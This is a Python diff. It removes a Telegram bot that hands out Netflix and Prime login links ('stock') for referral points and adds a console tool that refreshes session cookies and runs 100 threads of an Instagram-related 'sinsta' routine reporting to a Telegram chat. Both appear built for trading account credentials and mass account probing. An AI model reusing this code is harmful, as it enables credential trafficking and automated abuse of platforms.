-            [InlineKeyboardButton(f"{E('remove')} Remove Channel", callback_data="admin_remove_channel")],
-            [InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")],
-        ]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data in ["admin_addstock_netflix", "admin_addstock_prime"]:
-        sv = 'netflix' if 'netflix' in data else 'prime'
-        icon = E('netflix') if sv == 'netflix' else E('prime')
-        if not is_admin(user_id):
-            return
-        await query.edit_message_text(
-            f"{icon} **Add {sv.title()} Stock**\n\nUse: `/addstock {sv}`\nThen send login link.",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")]])
-        )
-
-    elif data == "admin_stock_lists":
-        if not is_admin(user_id):
-            return
-        kb = [
-            [InlineKeyboardButton(f"{E('netflix')} Netflix Stock", callback_data="admin_stock_list_netflix")],
-            [InlineKeyboardButton(f"{E('prime')} Prime Stock", callback_data="admin_stock_list_prime")],
-            [InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")],
-        ]
-        await query.edit_message_text(f"{E('stock')} **Stock Lists**", parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_stock_list_netflix":
-        if not is_admin(user_id):
-            return
-        items = get_all_stock('netflix')
-        if not items:
-            text = f"{E('netflix')} **No Netflix stock**"
-        else:
-            text = f"{E('netflix')} **Netflix Stock ({len(items)})**\n\n"
-            for s in items[:15]:
-                sid = s[0]
-                link_preview = str(s[1])[:30]
-                status_text = f"{E('check')} avail" if s[5] == 'available' else f"{E('key')} → {s[6]}"
-                text += f"`#{sid}` {status_text} `{link_preview}...`\n"
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_stock_lists")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_stock_list_prime":
-        if not is_admin(user_id):
-            return
-        items = get_all_stock('prime')
-        if not items:
-            text = f"{E('prime')} **No Prime stock**"
-        else:
-            text = f"{E('prime')} **Prime Stock ({len(items)})**\n\n"
-            for s in items[:15]:
-                sid = s[0]
-                link_preview = str(s[1])[:30]
-                status_text = f"{E('check')} avail" if s[5] == 'available' else f"{E('key')} → {s[6]}"
-                text += f"`#{sid}` {status_text} `{link_preview}...`\n"
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_stock_lists")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_gen_code":
-        if not is_admin(user_id):
-            return
-        await query.edit_message_text(
-            f"{E('gift')} **Generate Code**\n\nSend number of points (1-100):",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('back')} Cancel", callback_data="admin_panel")]])
-        )
-        set_user_data(user_id, "awaiting_code_points", True)
-
-    elif data == "admin_codes_list":
-        if not is_admin(user_id):
-            return
-        codes = get_all_gift_codes()
-        if not codes:
-            text = f"{E('gift')} **No codes yet**"
-        else:
-            act = len([c for c in codes if c[6] == 'active'])
-            red = len([c for c in codes if c[6] == 'redeemed'])
-            text = f"{E('gift')} **Codes: {act} active | {red} redeemed**\n\n"
-            for c in codes[:10]:
-                status_icon = f"{E('check')}" if c[6] == 'active' else f"{E('key')}"
-                redeemed_info = f" → `{c[5]}`" if c[5] else ""
-                text += f"{status_icon} `{c[1]}` {E('star')}{c[2]}{redeemed_info}\n"
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_pending":
-        if not is_admin(user_id):
-            return
-        pend = get_pending_withdrawals()
-        if not pend:
-            text = f"{E('time')} **No pending requests** {E('check')}"
-            kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")]]
-        else:
-            text = f"{E('time')} **Pending ({len(pend)})**\n\n"
-            for w in pend:
-                u = get_user(w[1])
-                un = u[2] if u else "?"
-                ic = E('netflix') if w[2] == 'netflix' else E('prime')
-                text += f"{ic} `#{w[0]}` **{un}** `{w[1]}` {w[5][:16]}\n"
-            kb = [
-                [InlineKeyboardButton(f"{E('check')} Fulfill", callback_data="admin_fulfill_menu")],
-                [InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")],
-            ]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_fulfill_menu":
-        if not is_admin(user_id):
-            return
-        pend = get_pending_withdrawals()
-        if not pend:
-            await query.edit_message_text(f"{E('check')} All done!",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")]]))
-            return
-        kb = []
-        for w in pend[:10]:
-            u = get_user(w[1])
-            un = u[2] if u else "?"
-            ic = E('netflix') if w[2] == 'netflix' else E('prime')
-            kb.append([InlineKeyboardButton(f"#{w[0]} {un} {ic}", callback_data=f"fulfill_{w[0]}")])
-        kb.append([InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_pending")])
-        await query.edit_message_text(f"{E('check')} **Select to fulfill:**", parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data.startswith("fulfill_"):
-        if not is_admin(user_id):
-            return
-        wid = int(data.replace("fulfill_", ""))
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("SELECT user_id, type, points_used FROM withdrawals WHERE id=?", (wid,))
-        r = c.fetchone()
-        conn.close()
-        if r:
-            uid, wtype, pts = r
-            sv = wtype if wtype in ['netflix', 'prime'] else 'netflix'
-            st = get_available_stock(sv)
-            try:
-                if st:
-                    assign_stock(st[0], uid, sv)
-                    await context.bot.send_message(uid,
-                        f"{E(sv)} **{sv.title()} Delivered!**\n"
-                        f"{E('check')} Request `#{wid}`\n"
-                        f"{E('key')} `{st[1]}`\n"
-                        f"{E('lock')} Change password!",
-                        parse_mode="HTML")
-                else:
-                    await context.bot.send_message(uid,
-                        f"{E(sv)} **{sv.title()} Delivered!**\n"
-                        f"Contact @{ADMIN_USERNAMES[0]} for details.",
-                        parse_mode="HTML")
-            except:
-                pass
-            fulfill_withdrawal(wid)
-
-        await query.answer(f"{E('check')} #{wid} fulfilled!", show_alert=True)
-        pend = get_pending_withdrawals()
-        if not pend:
-            text = f"{E('time')} **All fulfilled!** {E('check')}"
-            kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")]]
-        else:
-            text = f"{E('time')} **Pending ({len(pend)})**\n\n"
-            for w in pend:
-                u = get_user(w[1])
-                un = u[2] if u else "?"
-                text += f"`#{w[0]}` **{un}** `{w[1]}`\n"
-            kb = [[InlineKeyboardButton(f"{E('check')} Fulfill", callback_data="admin_fulfill_menu")],
-                  [InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_users":
-        if not is_admin(user_id):
-            return
-        all_u = get_all_users()
-        text = f"{E('people')} **All Users ({len(all_u)})**\n\n"
-        for u in all_u[:20]:
-            text += f"`{u[0]}` **{u[2]}** {E('star')}{u[3]} {E('people')}{u[4]} {E('netflix')}{u[7]} {E('prime')}{u[8]}\n"
-        if len(all_u) > 20:
-            text += f"\n... +{len(all_u)-20} more"
-        kb = [[InlineKeyboardButton(f"{E('back')} Back", callback_data="admin_panel")]]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "admin_broadcast":
-        if not is_admin(user_id):
-            return
-        await query.edit_message_text(
-            f"{E('broadcast')} **Broadcast** {E('warning')}\n\nSend message for ALL users:",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('back')} Cancel", callback_data="admin_panel")]])
-        )
-        set_user_data(user_id, "awaiting_broadcast", True)
-
-
-# ============================================================
-# 📝 TEXT HANDLER - PERSISTENT STATE FROM DB
-# ============================================================
-async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    uid = user.id
-    text = update.message.text.strip()
-
-    flags = get_user_flags(uid)
-
-    # Add channel via text
-    if flags.get("awaiting_channel_add") and is_admin(uid):
-        del_user_data(uid, "awaiting_channel_add")
-        ch_input = text
-        ch_username = ""
-        ch_link = ""
-        ch_id = ""
-
-        if ch_input.startswith('-100') or ch_input.startswith('-'):
-            ch_id = ch_input
-            ch_username = ch_input
-            ch_link = ""
-        elif ch_input.startswith('@'):
-            ch_username = ch_input.replace('@', '')
-            ch_id = ch_username
-            ch_link = f"https://t.me/{ch_username}"
-        else:
-            await update.message.reply_text(
-                f"{E('cross')} Invalid format!\nUse `@channelusername` or `-1001234567890`",
-                parse_mode="HTML"
-            )
-            return
-
-        # ============================================================
-# 📦 /addstock CONVERSATION
-# ============================================================
-ADD_LINK, ADD_CONF = range(2)
-
-async def addstock_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not is_admin(uid):
-        await update.message.reply_text(f"{E('cross')} Admins only")
-        return ConversationHandler.END
-    sv = 'netflix'
-    if context.args and context.args[0].lower() in ['prime', 'netflix']:
-        sv = context.args[0].lower()
-    context.user_data["addstock_svc"] = sv
-    ic = E('netflix') if sv == 'netflix' else E('prime')
-    await update.message.reply_text(
-        f"{ic} **Add {sv.title()} Stock**\n\nSend login link or `/cancel`:",
-        parse_mode="HTML")
-    return ADD_LINK
-
-async def addstock_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    link = update.message.text.strip()
-    if link == "/cancel":
-        await update.message.reply_text(
-            f"{E('cross')} Cancelled",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('admin')} Panel", callback_data="admin_panel")]])
-        )
-        return ConversationHandler.END
-    context.user_data["pending_link"] = link
-    sv = context.user_data.get("addstock_svc", "netflix")
-    ic = E('netflix') if sv == 'netflix' else E('prime')
-    await update.message.reply_text(
-        f"{ic} **Confirm**\n`{link[:50]}{'...' if len(link) > 50 else ''}`",
-        parse_mode="HTML",
-        reply_markup=ReplyKeyboardMarkup(
-            [[KeyboardButton(f"{E('check')} Confirm"), KeyboardButton(f"{E('cross')} Cancel")]],
-            resize_keyboard=True, one_time_keyboard=True))
-    return ADD_CONF
-
-async def addstock_conf(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    t = update.message.text.strip()
-    link = context.user_data.get("pending_link", "")
-    sv = context.user_data.get("addstock_svc", "netflix")
-    if E('check') in t or "confirm" in t.lower():
-        sid = add_stock(link, update.effective_user.id, sv)
-        sc = get_stock_count(sv)
-        await update.message.reply_text(
-            f"{E('check')} **{sv.title()} Added!**\n`#{sid}` | Available: `{sc['available']}`",
-            parse_mode="HTML",
-            reply_markup=ReplyKeyboardRemove())
-        return ADD_LINK
-    else:
-        await update.message.reply_text(f"{E('cross')} Cancelled", reply_markup=ReplyKeyboardRemove())
-        return ConversationHandler.END
-
-async def addstock_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(f"{E('cross')} Cancelled")
-    return ConversationHandler.END
-
-# ============================================================
-# 📋 COMMANDS
-# ============================================================
-async def points_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    ud = get_user(update.effective_user.id)
-    if not ud:
-        await update.message.reply_text(f"{E('cross')} Use /start")
-        return
-    t = f"{E('star')} **Stats**\n{E('star')}`{ud[3]}` | {E('people')}`{ud[4]}` | {E('netflix')}`{ud[7]}` | {E('prime')}`{ud[8]}`"
-    await update.message.reply_text(t, parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('back')} Menu", callback_data="back_home")]]))
-
-async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    link = f"https://t.me/{context.bot.username}?start=ref_{update.effective_user.id}"
-    await update.message.reply_text(f"{E('link')} **Your Link**\n`{link}`", parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('back')} Menu", callback_data="back_home")]]))
-
-async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not is_admin(uid):
-        await update.message.reply_text(f"{E('cross')} Admins only")
-        return
-    if not context.args:
-        await update.message.reply_text(f"{E('cross')} Usage: `/addchannel @channelusername`", parse_mode="HTML")
-        return
-    ch_input = context.args[0]
-    ch_username = ""; ch_link = ""; ch_id = ""
-    if ch_input.startswith('@'):
-        ch_username = ch_input.replace('@', '')
-        ch_id = ch_username
-        ch_link = f"https://t.me/{ch_username}"
-    elif ch_input.startswith('-'):
-        ch_id = ch_input
-        ch_username = ch_input
-    else:
-        await update.message.reply_text(f"{E('cross')} Invalid format!\nUse `@channelusername` or `-1001234567890`", parse_mode="HTML")
-        return
-    success, msg = add_required_channel(ch_id, ch_username, ch_link, uid)
-    await update.message.reply_text(f"{E('check') if success else E('cross')} {msg}",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('admin')} Panel", callback_data="admin_panel")]]))
-
-async def removechannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not is_admin(uid):
-        await update.message.reply_text(f"{E('cross')} Admins only")
-        return
-    if not context.args:
-        await update.message.reply_text(f"{E('cross')} Usage: `/removechannel @channelusername`", parse_mode="HTML")
-        return
-    ch_input = context.args[0]
-    ch_id = ch_input.replace('@', '') if ch_input.startswith('@') else ch_input
-    removed = remove_required_channel(ch_id)
-    if removed:
-        await update.message.reply_text(f"{E('check')} Channel removed!",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E('admin')} Panel", callback_data="admin_panel")]]))
-    else:
-        await update.message.reply_text(f"{E('cross')} Channel not found!")
-
-async def channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    channels = get_required_channels()
-    if not channels:
-        await update.message.reply_text(f"{E('channel')} **No required channels set.**", parse_mode="HTML")
-        return
-    text = f"{E('channel')} **Required Channels ({len(channels)})**\n\n"
-    for ch in channels:
-        cid, username, link = ch[1], ch[2], ch[3]
-        text += f"{E('join')} `{username or cid}`\n  Link: `{link or 'N/A'}`\n\n"
-    await update.message.reply_text(text, parse_mode="HTML")
-
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    logger.error(f"Update {update} caused error {context.error}", exc_info=context.error)
-
-# ============================================================
-# 🚀 MAIN
-# ============================================================
 def main():
-    init_db()
-    logger.info("Database initialized")
+    global TOKEN, CHAT_ID
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f"""{M}{B}
+╔═══━━━─── ✦ ───━━━═══╗
+        𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐒𝐄𝐓𝐔𝐏
+╚═══━━━─── ✦ ───━━━═══╝
+{RESET_COL}""")
+    TOKEN = input(
+f"""{C}{B}
+╭──────────── ✦ ────────────╮
+│      𝐄𝐍𝐓𝐄𝐑 𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍
+╰──────────── ✦ ────────────╯
+{M}➤ {RESET_COL}"""
+    ).strip()
+    if not TOKEN:
+        print(
+f"""{R}{B}
+╔═══━━━─── ⚠ ───━━━═══╗
+        𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐍𝐏𝐔𝐓
+╚═══━━━─── ⚠ ───━━━═══╝
 
-    app = Application.builder().token(TOKEN).build()
+╭──────────── ✦ ────────────╮
+│  𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 𝐈𝐒 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃
+╰──────────── ✦ ────────────╯
+{RESET_COL}"""
+        )
+        sys.exit()
+    CHAT_ID = input(
+f"""{C}{B}
+╭──────────── ✦ ────────────╮
+│       𝐄𝐍𝐓𝐄𝐑 𝐂𝐇𝐀𝐓 𝐈𝐃
+╰──────────── ✦ ────────────╯
+{M}➤ {RESET_COL}"""
+    ).strip()
+    if not CHAT_ID:
+        print(
+f"""{R}{B}
+╔═══━━━─── ⚠ ───━━━═══╗
+        𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐍𝐏𝐔𝐓
+╚═══━━━─── ⚠ ───━━━═══╝
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("points", points_command))
-    app.add_handler(CommandHandler("referral", referral_command))
-    app.add_handler(CommandHandler("addchannel", addchannel_command))
-    app.add_handler(CommandHandler("removechannel", removechannel_command))
-    app.add_handler(CommandHandler("channels", channels_command))
+╭──────────── ✦ ────────────╮
+│   𝐂𝐇𝐀𝐓 𝐈𝐃 𝐈𝐒 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃
+╰──────────── ✦ ────────────╯
+{RESET_COL}"""
+        )
+        sys.exit()
 
-    conv = ConversationHandler(
-        entry_points=[CommandHandler("addstock", addstock_start)],
-        states={
-            ADD_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, addstock_link)],
-            ADD_CONF: [MessageHandler(filters.TEXT & ~filters.COMMAND, addstock_conf)],
-        },
-        fallbacks=[CommandHandler("cancel", addstock_cancel)]
-    )
-    app.add_handler(conv)
-    app.add_handler(CallbackQueryHandler(button_callback))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_messages))
-    app.add_error_handler(error_handler)
+    _next_about_session()
+    about_refresh_tokens(ABOUT_COOKIE_STR)
+    Thread(target=about_token_refresher, daemon=True).start()
+    Thread(target=get_tl_background, daemon=True).start()
+    Thread(target=stats, daemon=True).start()
+    gtokens()
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-    logger.info(f"Bot starting - Admins: {ADMIN_USERNAMES}")
-    logger.info(f"Payout Channel: {PAYOUT_CHANNEL}")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    MAX_WORKERS = 100
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = []
+        for _ in range(MAX_WORKERS):
+            low, high, yr = get_random_year_range()
+            futures.append(executor.submit(sinsta, low, high, TOKEN, CHAT_ID))
+        try:
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except Exception:
+                    pass
+        except KeyboardInterrupt:
+            print(f"\n{R}{B}[!] Interrupted by user. Exiting...{RESET_COL}")
+            executor.shutdown(wait=False, cancel_futures=True)
+            sys.exit(0)
 
 if __name__ == "__main__":
     main()
